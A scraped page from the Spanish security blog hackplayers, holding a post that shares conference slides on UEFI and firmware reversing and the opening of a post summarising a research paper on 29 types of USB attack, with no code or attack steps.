<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html dir='ltr' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<head>
<link href='https://www.blogger.com/static/v1/widgets/3957297643-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
<!-- jquery - vmotos -->
<script src='http://ajax.g oogleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js' type='text/javascript'></script>
<script src='http://code.jquery.com/jquery-latest.js' type='text/javascript'></script>
<!-- code syntax highlighting - vmotos -->
<script src='https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js'></script>
<meta content='RbLgoQsxwqK97c--008jUeSOADnCub4ndxTQFZ5-oRs' name='google-site-verification'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta content='blogger' name='generator'/>
<link href='http://www.hackplayers.com/favicon.ico' rel='icon' type='image/x-icon'/>
<link href='http://www.hackplayers.com/' rel='canonical'/>
<link rel="alternate" type="application/atom+xml" title="hackplayers - Atom" href="http://www.hackplayers.com/feeds/posts/default" />
<link rel="alternate" type="application/rss+xml" title="hackplayers - RSS" href="http://www.hackplayers.com/feeds/posts/default?alt=rss" />
<link rel="service.post" type="application/atom+xml" title="hackplayers - Atom" href="https://www.blogger.com/feeds/9133539773684103848/posts/default" />
<link rel="me" href="https://www.blogger.com/profile/03053036399006390105" />
<link rel="openid.server" href="https://www.blogger.com/openid-server.g" />
<link rel="openid.delegate" href="http://www.hackplayers.com/" />
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<meta content='http://www.hackplayers.com/' property='og:url'/>
<meta content='hackplayers' property='og:title'/>
<meta content='Computer security, ethical hacking and more!' property='og:description'/>
<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
<link href='http://www.iconj.com/ico/8/s/8scsy46d39.ico' rel='shortcut icon' type='image/x-icon'/>
<link href='http://www.iconj.com/ico/8/s/8scsy46d39.ico' rel='icon' type='image/x-icon'/>
<!-- Start Widget-based: Changing the Blogger Title Tag - vmotos -->
<title>
hackplayers
</title>
<!-- End Widget-based: Changing the Blogger Title Tag -->
<meta content='Computer security, ethical hacking and more' name='description'/>
<meta content='Blog, Blogs, hacking, hack, hacker, security, seguridad, herramientas, tools, vulnerabilities, vulnerabilidades, eventos, tutoriales, malware' name='keywords'/>
<meta content='vmotos brujeador' name='author'/>
<meta content='all' name='robots'/>
<meta content='text/html; charset=iso-8859-1' http-equiv='Content-Type'/>
<meta content='es' http-equiv='Content-Language'/>
<meta content='hackplayer' name='copyright'/>
<meta content='hackplayer@ymail.com' name='Reply-to'/>
<meta content='blogger' name='generator'/>
<base href='http://www.hackplayers.com/'/>
<style id='page-skin-1' type='text/css'><!--
/*
-----------------------------------------------
Blogger HackPlayers Madrid
Name:     Hackplayers
Author:   vmotos
URL:      www.hackplayers.com
Date:     December 2009
Blogger Template Style
Name:     iNove
Author:   Klodian
URL:      www.deluxetemplates.net
Date:     June 2009
----------------------------------------------- */
#navbar-iframe {
display: none !important;
}
/* Variable definitions
====================
<Variable name="bgcolor" description="Page Background Color"
type="color" default="#fff">
<Variable name="textcolor" description="Text Color"
type="color" default="#333">
<Variable name="linkcolor" description="Link Color"
type="color" default="#58a">
<Variable name="pagetitlecolor" description="Blog Title Color"
type="color" default="#666">
<Variable name="descriptioncolor" description="Blog Description Color"
type="color" default="#999">
<Variable name="titlecolor" description="Post Title Color"
type="color" default="#c60">
<Variable name="bordercolor" description="Border Color"
type="color" default="#ccc">
<Variable name="sidebarcolor" description="Sidebar Title Color"
type="color" default="#999">
<Variable name="sidebartextcolor" description="Sidebar Text Color"
type="color" default="#666">
<Variable name="visitedlinkcolor" description="Visited Link Color"
type="color" default="#999">
<Variable name="font" description="Text Font"
type="font" default="normal normal 85% Verdana">
<Variable name="headerfont" description="Sidebar Title Font"
type="font"
default="normal normal 78% 'Trebuchet MS',Trebuchet,Arial,Verdana,Sans-serif">
<Variable name="pagetitlefont" description="Blog Title Font"
type="font"
default="normal normal 200% Georgia, Serif">
<Variable name="descriptionfont" description="Blog Description Font"
type="font"
default="normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif">
<Variable name="postfooterfont" description="Post Footer Font"
type="font"
default="normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif">
<Variable name="startSide" description="Side where text starts in blog language"
type="automatic" default="left">
<Variable name="endSide" description="Side where text ends in blog language"
type="automatic" default="right">
*/
/* Use this with templates/template-twocol.html */
body {
background:#BEC3C6 url(http://2.bp.blogspot.com/_66wIGDjagHk/Siu8rIbkPHI/AAAAAAAAAis/02GRmT6BZ2g/s1600/bg.jpg) repeat-x scroll 0 0;
color:#333333;
font-family:verdana, sans-serif;
font-size:small;
font-size-adjust:none;
font-stretch:normal;
font-style:normal;
font-variant:normal;
font-weight:normal;
line-height:normal;
margin:0;
text-align:center;
}
a:link {
color:#2970A6;
text-decoration:none;
}
a:visited {
color:#2970A6;
text-decoration:none;
}
a:hover {
color:#5588AA;
text-decoration:underline;
}
a img {
border-width:0;
}
#header-wrapper {
background:transparent url(http://3.bp.blogspot.com/_66wIGDjagHk/Siu81fO0RrI/AAAAAAAAAi0/0gVEgpIwIRo/s1600/header.jpg) no-repeat scroll 0 0;
border-bottom:1px solid #A6A6A6;
height:90px;
margin-bottom:-13px;
width:936px;
}
#header-inner {
background-position:center center;
margin-left:auto;
margin-right:auto;
}
#header {
color:#FFFFFF;
margin:5px;
text-align:left;
}
#header h1 {
font-family:Trajan pro;
font-size:200%;
font-size-adjust:none;
font-stretch:normal;
font-style:normal;
font-variant:normal;
font-weight:bold;
letter-spacing:0;
line-height:normal;
margin:5px 5px 0;
padding:20px 20px 0;
text-transform:none;
}
#header a {
color:#ffffff;
text-decoration:none;
}
#header a:hover {
color:#ffffff;
}
#header .description {
color:#EEEEEE;
font-family:arial;
font-size:12px;
font-size-adjust:none;
font-stretch:normal;
font-style:normal;
font-variant:normal;
font-weight:normal;
letter-spacing:0.2em;
line-height:normal;
margin:0 5px 5px;
max-width:700px;
padding:0 20px 15px;
text-transform:none;
}
#header img {
margin-left:auto;
margin-right:auto;
}
#outer-wrapper {
font-family:Arial;
font-size:100%;
font-size-adjust:none;
font-stretch:normal;
font-style:normal;
font-variant:normal;
font-weight:normal;
line-height:normal;
margin:0 auto;
padding:10px;
text-align:left;
width:936px;
}
#main-wrapper {
background:#FFFFFF url(http://4.bp.blogspot.com/_66wIGDjagHk/Siu89uh0JpI/AAAAAAAAAi8/C5bFzJTSeQE/s1600/main_shadow.gif) repeat-x scroll center top;
float:left;
overflow:hidden;
padding:18px 15px 15px 20px;
width:600px;
}
#sidebar-wrapper {
background:#F7F7F7 url(http://3.bp.blogspot.com/_66wIGDjagHk/Siu9F542R1I/AAAAAAAAAjE/O-eySkYKmQM/s1600/sidebar_shadow.gif) repeat-x scroll center top;
float:right;
overflow:hidden;
padding-left:15px;
padding-right:10px;
width:275px;
padding-top:10px;
}
.mobile #sidebar-wrapper {
Display: none;
}
h2 {
border-bottom:1px solid #EEEEEE;
color:#333333;
font-family:arial;
font-size:14px;
font-size-adjust:none;
font-stretch:normal;
font-style:normal;
font-variant:normal;
font-weight:bold;
line-height:1.4em;
margin:1.5em 0 0.75em;
text-transform:none;
}
h2.date-header {
margin:1.5em 0 0.5em;
}
.post {
margin: 0.5em 0 10px;
padding-bottom: 30px;
}
.post h3 {
border-bottom:1px solid #CCCCCC;
color:#000000;
font-family:verdana;
font-size:18px;
font-weight:bold;
line-height:1.4em;
margin:0.25em 0 0;
padding:0 0 4px;
}
.post h3 a, .post h3 a:visited, .post h3 strong {
color:#000000;
display:block;
font-weight:bold;
text-decoration:none;
}
.post h3 strong, .post h3 a:hover {
color:#333333;
}
.post-body {
font-size:14px;
font-family:verdana, sans-serif;
font-size:small;
line-height:1.6em;
margin:0 0 0.75em;
}
.post-body blockquote {
line-height:1.3em;
}
.post-footer {
color:#999999;
font-family:'Trebuchet MS',Trebuchet,Arial,Verdana,Sans-serif;
font-size:10px;
font-size-adjust:none;
font-stretch:normal;
font-style:normal;
font-variant:normal;
font-weight:normal;
line-height:1.4em;
margin:0.75em 0;
text-transform:uppercase;
}
.comment-link {
}
.post img {
border:0px;
padding:2px;
}
.post blockquote {
margin:1em 20px;
}
.post blockquote p {
margin:0.75em 0;
}
.comment-author {
}
#comments h4 {
color:#666666;
font-weight:bold;
letter-spacing:0.2em;
line-height:1.4em;
margin:1em 0;
text-transform:none;
}
#comments-block {
line-height:1.6em;
margin:1em 0 1.5em;
}
#comments-block .comment-author {
background:#EEEEEE none repeat scroll 0 0;
border:1px solid #EEEEEE;
font-size:15px;
font-weight:bold;
margin-right:20px;
padding:5px;
}
#comments .blogger-comment-icon, .blogger-comment-icon {
background:#EEEEEE none repeat scroll 0 0;
border-color:#CCCCCC #CCCCCC #EEEEEE;
border-style:solid;
border-width:2px 1px 1px;
line-height:16px;
padding:5px;
}
#comments-block .comment-body {
border-left:1px solid #EEEEEE;
border-right:1px solid #EEEEEE;
margin-left:0;
margin-right:20px;
padding:7px;
}
#comments-block .comment-footer {
border-bottom:1px solid #EEEEEE;
border-left:1px solid #EEEEEE;
border-right:1px solid #EEEEEE;
font-size:11px;
line-height:1.4em;
margin:-0.25em 20px 2em 0;
padding:5px;
text-transform:none;
}
#comments-block .comment-body p {
margin:0 0 0.75em;
}
.deleted-comment {
color:gray;
font-style:italic;
}
#blog-pager-newer-link {
float:left;
}
#blog-pager-older-link {
float:right;
}
#blog-pager {
text-align:center;
}
.feed-links {
clear:both;
line-height:2.5em;
}
.sidebar {
color:#666666;
font-size:12px;
line-height:1.5em;
}
.sidebar ul {
list-style-image:none;
list-style-position:outside;
list-style-type:none;
margin:0;
padding:0;
}
.sidebar li {
background:transparent url(http://2.bp.blogspot.com/_66wIGDjagHk/Siu9RUcbv2I/AAAAAAAAAjM/gObN_C4Q-OU/s1600/poin.png) no-repeat scroll 0 1px;
line-height:1.5em;
margin:0;
padding:0 0 0.25em 20px;
}
.sidebar .widget, .main .widget {
margin:0 0 1.5em;
padding:0 0 1.5em;
}
.main .Blog {
border-bottom-width:0;
}
.profile-img {
border:1px solid #CCCCCC;
float:left;
margin:0 5px 5px 0;
padding:4px;
}
.profile-data {
color:#999999;
font-family:'Trebuchet MS',Trebuchet,Arial,Verdana,Sans-serif;
font-size:78%;
font-size-adjust:none;
font-stretch:normal;
font-style:normal;
font-variant:normal;
font-weight:bold;
letter-spacing:0.1em;
line-height:1.6em;
margin:0;
text-transform:uppercase;
}
.profile-datablock {
margin:0.5em 0;
}
.profile-textblock {
line-height:1.6em;
margin:0.5em 0;
}
.profile-link {
font-family:'Trebuchet MS',Trebuchet,Arial,Verdana,Sans-serif;
font-size:78%;
font-size-adjust:none;
font-stretch:normal;
font-style:normal;
font-variant:normal;
font-weight:normal;
letter-spacing:0.1em;
line-height:normal;
text-transform:uppercase;
}
#footer {
background:transparent url(http://3.bp.blogspot.com/_66wIGDjagHk/Siu9mVfIzUI/AAAAAAAAAjc/izth3bpXAZg/s1600/footer.jpg) no-repeat scroll 0 0;
border-top:1px solid #CCCCCC;
display:block;
font-size:11px;
height:88px;
line-height:145%;
width:100%;
}
#footer a {
color:#2A2A2A;
}
#copyright {
margin-left:20px;
margin-top:12px;
}
#themeinfo {
margin-left:20px;
}
a#powered {
background:transparent url() no-repeat scroll 0 0;
display:block;
float:left;
height:57px;
margin:0 10px 0 5px;
text-indent:-999em;
width:92px;
}
a#gotop {
background:transparent url() no-repeat scroll 0 -304px;
display:block;
float:right;
height:16px;
line-height:18px;
margin:5px 15px 0 0 !important;
padding-left:16px;
text-decoration:none;
}
#wrap {
background:transparent url(http://2.bp.blogspot.com/_66wIGDjagHk/Siu-posCVMI/AAAAAAAAAjs/ZN67FPHq3vA/s1600/light.gif) no-repeat scroll center top;
padding:20px 0;
}
#navigation {
background:#FFFFFF none repeat scroll 0 0;
border-bottom:1px solid #A6A6A6;
height:31px;
}
#menus li {
display:inline;
list-style-image:none;
list-style-position:outside;
list-style-type:none;
}
#menus li a {
background:transparent url(http://3.bp.blogspot.com/_66wIGDjagHk/Siu-20JiAVI/AAAAAAAAAj0/0HpoiYZVXOk/s1600/menu.gif) no-repeat scroll 0 0;
color:#382E1F;
display:block;
float:left;
font-size:11px;
height:31px;
line-height:31px;
margin-left:-10px;
padding:0 20px;
text-decoration:none;
z-index:1;
}
#menus li a:hover, #menus li a.current {
background-position:0 -31px;
}
#menus li.current_page_item a, #menus li.current-cat a {
background-position:0 -62px;
}
#menus li a.home {
background-position:0 -93px;
margin-left:0;
padding:0;
text-indent:-999em;
width:45px;
}
#menus li a.home:hover {
background-position:0 -124px;
}
#menus li.current_page_item a.home {
background-position:0 -155px;
margin-left:-40px;
}
#menus li a.lastmenu:hover {
background-position:0 0;
cursor:default;
}
#searchbox {
background:transparent url(http://4.bp.blogspot.com/_66wIGDjagHk/Siu_TbjBfdI/AAAAAAAAAkE/Tts7ZYXYPq4/s1600/searchbox.gif) no-repeat scroll 0 0;
display:block;
float:right;
height:23px;
margin-right:10px !important;
margin-top:4px;
padding:2px;
width:209px;
}
#searchbox .textfield {
background:transparent none repeat scroll 0 0;
border:0 none;
float:left;
margin-right:2px;
padding-left:2px;
width:185px;
}
#searchbox .button {
background:transparent none repeat scroll 0 0;
border:0 none;
cursor:pointer;
float:left;
height:18px;
margin-top:1px;
width:18px;
}
#searchbox .searchtip {
color:#999999;
}
#content-wrapper {
background:#FFFFFF url(http://2.bp.blogspot.com/_66wIGDjagHk/Siu_neBvpVI/AAAAAAAAAkM/DEnYETL06P4/s1600/sidesep.gif) repeat-y scroll right center;
min-height:400px;
}
#footer2 {
border:0 none;
cursor:pointer;
float:left;
margin-top:0px;
width:500px;
}
span.fadehover {
position: relative;
}
img.a {
position: relative;
}
img.b {
position: relative;
}
/* LinkWithin personalizado
----------------------------------------------- */
.linkwithin_inner {margin:0 auto !important;}
.linkwithin_div {
background: #F2F2F2; /* Color de fondo */
padding: 0 10px;
}
.linkwithin_text {
font-size:14px; /* Tamaño del título del gadget */
color:#084B8A; /* Color del título del gadget */
}
a#linkwithin_logolink_0, a#linkwithin_logolink_1, a#linkwithin_logolink_2, a#linkwithin_logolink_3, a#linkwithin_logolink_4, a#linkwithin_logolink_5, a#linkwithin_logolink_6, a#linkwithin_logolink_7, a#linkwithin_logolink_8, a#linkwithin_logolink_9, a#linkwithin_logolink_10, a#linkwithin_logolink_11, a#linkwithin_logolink_12, a#linkwithin_logolink_13, a#linkwithin_logolink_14, a#linkwithin_logolink_15, a#linkwithin_logolink_16, a#linkwithin_logolink_17, a#linkwithin_logolink_18, a#linkwithin_logolink_19, a#linkwithin_logolink_20 {
display:none; /* Con esto quitamos el enlace */
}
.linkwithin_posts {
width: 500px !important; /* Ancho del gadget */
}
.linkwithin_posts a {
border: 0 !important;
padding-right: 10px !important;
}
.linkwithin_posts a:hover {
background: #819FF7 !important; /* Color de fondo al pasar el cursor */
-webkit-border-radius: 10px !important;
-moz-border-radius: 10px;
border-radius: 10px;
}
.linkwithin_img_0 div, div.linkwithin_img_0,
.linkwithin_img_1 div, div.linkwithin_img_1,
.linkwithin_img_2 div, div.linkwithin_img_2,
.linkwithin_img_3 div, div.linkwithin_img_3,
.linkwithin_img_4 div, div.linkwithin_img_4,
.linkwithin_img_5 div, div.linkwithin_img_5,
.linkwithin_img_6 div, div.linkwithin_img_6,
.linkwithin_img_7 div, div.linkwithin_img_7,
.linkwithin_img_8 div, div.linkwithin_img_8,
.linkwithin_img_9 div, div.linkwithin_img_9,
.linkwithin_img_10 div, div.linkwithin_img_10,
.linkwithin_img_11 div, div.linkwithin_img_11,
.linkwithin_img_12 div, div.linkwithin_img_12,
.linkwithin_img_13 div, div.linkwithin_img_13,
.linkwithin_img_14 div, div.linkwithin_img_14,
.linkwithin_img_15 div, div.linkwithin_img_15,
.linkwithin_img_16 div, div.linkwithin_img_16,
.linkwithin_img_17 div, div.linkwithin_img_17,
.linkwithin_img_18 div, div.linkwithin_img_18,
.linkwithin_img_19 div, div.linkwithin_img_19,
.linkwithin_img_20 div, div.linkwithin_img_20 { /* Bordes redondeados */
-webkit-border-radius: 10px !important;
-moz-border-radius: 10px;
border-radius: 10px;
border:0 !important;
}
.linkwithin_title {
color: #0431B4 !important; /* Color de los títulos de las entradas */
font-family: Verdana !important; /* Tipo de fuente de los títulos de las entradas */
font-size: 10px !important; /* Tamaño de los títulos de las entradas */
line-height: 12px !important;
text-align:center;
text-decoration: none;
}
.linkwithin_title:hover {
color: #000 !important; /* Color de los títulos al pasar el cursor */
font-weight: bold !important;
}
.reto15 img {
white-space:nowrap; padding:0px; border:0px; vertical-align:top;
}
.nobr	{
border: 0px;
padding: 0px;
white-space:nowrap; }

--></style>
<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.js' type='text/javascript'></script>
<script type='text/javascript'>
      //<![CDATA[
      $(document).ready(function(){
        $("img.a").hover(
          function() {
            $(this).stop().animate({"opacity": "0"}, "slow");
          },
          function() {
            $(this).stop().animate({"opacity": "1"}, "slow");
          });
      });
      //]]>
    </script>
<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=9133539773684103848&amp;zx=c251938c-698c-449c-95e9-e3cdc9c57b60' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=9133539773684103848&amp;zx=c251938c-698c-449c-95e9-e3cdc9c57b60' rel='stylesheet'/></noscript>
</head>
<body class='loading'>
<div class='navbar section' id='navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
<div id="navbar-iframe-container"></div>
<script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script>
<script type="text/javascript">
      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
        if (gapi.iframes && gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d9133539773684103848\x26blogName\x3dhackplayers\x26publishMode\x3dPUBLISH_MODE_HOSTED\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttp://www.hackplayers.com/search\x26blogLocale\x3des\x26v\x3d2\x26homepageUrl\x3dhttp://www.hackplayers.com/\x26vt\x3d-2192477480649975638',
              where: document.getElementById("navbar-iframe-container"),
              id: "navbar-iframe"
          });
        }
      });
    </script><script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div id='wrap'>
<div id='outer-wrapper'>
<div id='wrap2'>
<!-- skip links for text browsers -->
<span id='skiplinks' style='display:none;'>
<a href='#main'>
              skip to main 
            </a>
            |
            <a href='#sidebar'>
              skip to sidebar
            </a>
</span>
<div id='header-wrapper'>
<div class='header section' id='header'><div class='widget Header' data-version='1' id='Header1'>
<div id='header-inner'>
<a href='http://www.hackplayers.com/' style='display: block'>
<img alt='hackplayers' height='86px; ' id='Header1_headerimg' src='http://2.bp.blogspot.com/-y9ezAvREW3Q/UtUfYedN1pI/AAAAAAAAUp0/KXeElcymZVo/s1600/hackplayers-logo-long.gif' style='display: block' width='929px; '/>
</a>
</div>
</div></div>
</div>
<!-- navigation START -->
<div id='navigation'>
<!-- menus START -->
<ul id='menus'>
<li class='current_page_item'>
<a Title='Home' class='home' href='http://www.hackplayers.com/' title='Home'>
                  Home
                </a>
</li>
<li class='page_item page-item-2'>
<a href='http://www.hackplayers.com/p/participa.html' title='¡Existen muchas maneras de participar!'>
                  Participa
                </a>
</li>
<li class='page_item page-item-2'>
<a href='http://www.hackplayers.com/p/retos-de-hackplayers_5.html' title='Juega con nosotros'>
                  Retos
                </a>
</li>
<li class='page_item page-item-2'>
<a href='http://www.hackplayers.com/p/blogroll_11.html?m=0' title='Feeds de blogs de seguridad en español'>
                  Blogroll en español
                </a>
</li>
<li class='page_item page-item-2'>
<a href='http://www.hackplayers.com/p/blogroll-12.html?m=0' title='Feeds from IT security blogs in English'>
                  Blogroll in English
                </a>
</li>
<li class='page_item page-item-2'>
<a href='https://github.com/hackplayers' title='Herramientas propias'>
                  Herramientas
                </a>
</li>
<li class='page_item page-item-2'>
<a href='http://www.hackplayers.com/p/afiliados.html' title='Intercambio de banners'>
                  Afiliados
                </a>
</li>
</ul>
<!-- menus END -->
<!-- searchbox START -->
<div id='searchbox'>
<form action='search/' method='get'>
<div class='content'>
<input class='textfield' name='q' size='24' type='text' value=''/>
<input class='button' type='submit' value=''/>
</div>
</form>
</div>
</div>
<div id='content-wrapper'>
<div id='crosscol-wrapper' style='text-align:center'>
<div class='crosscol no-items section' id='crosscol'></div>
</div>
<div id='main-wrapper'>
<div class='main section' id='main'>
<div class='widget Blog' data-version='1' id='Blog1'>
<div class='blog-posts hfeed'>
<!--Can't find substitution for tag [adStart]-->
<div class='post hentry uncustomized-post-template'>
<a name='6804636238379359593'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/hardware-reversing-firmware-y-uefi-by-guillermo.html'>
Hardware reversing (firmware y UEFI) (by Guillermo Campillo #hc0n2018)
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Vicente Motos
</span>
<span class='post-timestamp'>

                                  on 
                                  lunes, 19 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/h-c0n' rel='tag'>
h-c0n
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/hardware' rel='tag'>
hardware
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/reversing' rel='tag'>
reversing
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/uefi' rel='tag'>
uefi
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/hardware-reversing-firmware-y-uefi-by-guillermo.html#comment-form' onclick=''>
0
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
Vamos acabando de publicar el material de los ponentes h-c0n, esta vez con la presentación 'Hardware reversing (firmware y UEFI)' de Guillermo Campillo (@pekeinfo), analista de malware y reversing desde el 2014 y en la actualidad trabajando en S21sec.<br />
<br />
Se trata de una introduccio&#769;n al ana&#769;lisis de aplicaciones UEFI para iniciarse en el mundo del ana&#769;lisis de UEFI. Durante varios an&#771;os cada di&#769;a es mas frecuente escuchar la palabra UEFI y en esa charla Guillermo nos contó qué es y qué no es UEFI, asi&#769; como una introduccio&#769;n para la depuracio&#769;n de aplicaciones que son de utilidad para tomar contacto sobre el esta&#769;ndar UEFI.<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<iframe height="320" src="https://drive.google.com/file/d/1XCfdcJemRJvYHHpf5K5lMIxg5-blFHcR/preview" width="530"></iframe><br /></div>
<h4>
- Fotos:</h4>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://3.bp.blogspot.com/-3mXQoDhq_RQ/WrBDt1PC7ZI/AAAAAAABFVw/y3HXe3i-jd0Wab4VDCi4Go9S60qX3u_wgCLcBGAs/s1600/19.jpeg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="960" data-original-width="1280" src="https://3.bp.blogspot.com/-3mXQoDhq_RQ/WrBDt1PC7ZI/AAAAAAABFVw/y3HXe3i-jd0Wab4VDCi4Go9S60qX3u_wgCLcBGAs/s640/19.jpeg" width="530" /></a></div>
<br />
<b>- Enlaces (web h-c0n):</b><br />
<br />
<a href="http://www.h-c0n.com/p/ponentes.html#Guillermo" target="_blank">http://www.h-c0n.com/p/ponentes.html#Guillermo</a><br />
<a href="http://www.h-c0n.com/p/ponencias.html#UEFI" target="_blank">http://www.h-c0n.com/p/ponencias.html#UEFI</a><br />
<h4>
<b>- Enlaces (agradecimientos):</b> </h4>
<h4>
<a href="https://www.blogger.com/goog_33972075">
</a><span style="font-weight: normal;"><a href="https://github.com/lmanoarchilla">https://github.com/lmanoarchilla</a><br /><a href="http://www.opensecuritytraining.info/IntroBIOS.html">http://www.opensecuritytraining.info/IntroBIOS.html</a></span></h4>
</div>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-backlinks post-comment-link'>
<a class='comment-link' href='http://www.hackplayers.com/2018/03/hardware-reversing-firmware-y-uefi-by-guillermo.html#links'>
Enlaces a esta entrada
</a>
</span>
<span class='post-icons'>
<span class='item-action'>
<a href='https://www.blogger.com/email-post.g?blogID=9133539773684103848&postID=6804636238379359593' title='Enviar entrada por correo electrónico'>
<img alt='' class='icon-action' height='13' src='http://www.blogger.com/img/icon18_email.gif' width='18'/>
</a>
</span>
<span class='item-control blog-admin pid-1378769495'>
<a href='https://www.blogger.com/post-edit.g?blogID=9133539773684103848&postID=6804636238379359593&from=pencil' title='Editar entrada'>
<img alt='' class='icon-action' height='18' src='http://www.blogger.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
<a href='http://twitter.com/home?status=http://www.hackplayers.com/2018/03/hardware-reversing-firmware-y-uefi-by-guillermo.html Hardware reversing (firmware y UEFI) (by Guillermo Campillo #hc0n2018)' onclick='return TweetAndTrack.open(this, "http://www.hackplayers.com/2018/03/hardware-reversing-firmware-y-uefi-by-guillermo.html");' target='_blank' title='¡Tweetea esto!'>
<span style='display:none;'>
Hardware reversing (firmware y UEFI) (by Guillermo Campillo #hc0n2018)
</span>
<img alt='Tweetea esto!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvM3Sb-3wI/AAAAAAAAAH0/6wuL-gO0a3U/twitter.gif' style='height:16px; width:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
<a href='http://www.facebook.com/sharer.php?u=http://www.hackplayers.com/2018/03/hardware-reversing-firmware-y-uefi-by-guillermo.html&t=Hardware reversing (firmware y UEFI) (by Guillermo Campillo #hc0n2018)' target='_blank' title='¡Comparte en Facebook!'>
<img alt='¡Comparte en Facebook!' src='http://1.bp.blogspot.com/_YUvD9j84Cik/TBvMxLns3dI/AAAAAAAAAHQ/K5W2YQeN6SY/facebook.gif' style='width:16px; height:16px; padding:0; border:0; vertical-align:middle;'/>
</a>
</span>
</div>
<p></p>
<div class='linkwithin_div'>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='post hentry uncustomized-post-template'>
<a name='7029598773175621050'></a>
<h3 class='post-title entry-title'>
<a href='http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html'>
29 tipos de ataque USB distintos
</a>
</h3>
<div class='post-footer'>
<div class='post-header-line-1'></div>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Publicado por
<span class='fn'>
Vicente Motos
</span>
<span class='post-timestamp'>

                                  on 
                                  viernes, 16 de marzo de 2018
</span>
</span>
<span class='post-labels'>
Etiquetas:
<a href='http://www.hackplayers.com/search/label/gadgets' rel='tag'>
gadgets
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/hardware' rel='tag'>
hardware
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/recopilatorios' rel='tag'>
recopilatorios
</a>

                                  ,
                                
<a href='http://www.hackplayers.com/search/label/t%C3%A9cnicas' rel='tag'>
técnicas
</a>
</span>
<span class='post-comment-link'>

                                Comentarios: (
                                <a class='comment-link' href='http://www.hackplayers.com/2018/03/29-tipos-de-ataque-usb-distintos.html#comment-form' onclick=''>
0
</a>
                                )
                              
</span>
</div>
</div>
<div class='post-header-line-1'></div>
<div class='post-body entry-content'>
<div dir="ltr" style="text-align: left;" trbidi="on">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://1.bp.blogspot.com/-RNvvKDzNn8U/Wqusu0EnQMI/AAAAAAABFNE/Q9OeLlKmFNEq2XDR7Sj4YtOvUWT49aHugCLcBGAs/s1600/usb_ataque.png" imageanchor="1" style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"><img border="0" data-original-height="183" data-original-width="275" src="https://1.bp.blogspot.com/-RNvvKDzNn8U/Wqusu0EnQMI/AAAAAAABFNE/Q9OeLlKmFNEq2XDR7Sj4YtOvUWT49aHugCLcBGAs/s1600/usb_ataque.png"></a></div>
Un grupo de investigadores de la Universidad Ben-Gurion de Negev en Israel publicó el año pasado en la revista ScienceDirect un interesante <a href="https://www.sciencedirect.com/science/article/pii/S0167404817301578" target="_blank">artículo</a> en el que identifican 29 formas distintas en las que podría usarse un dispositivo USB para comprometer un equipo.<br>
<br>
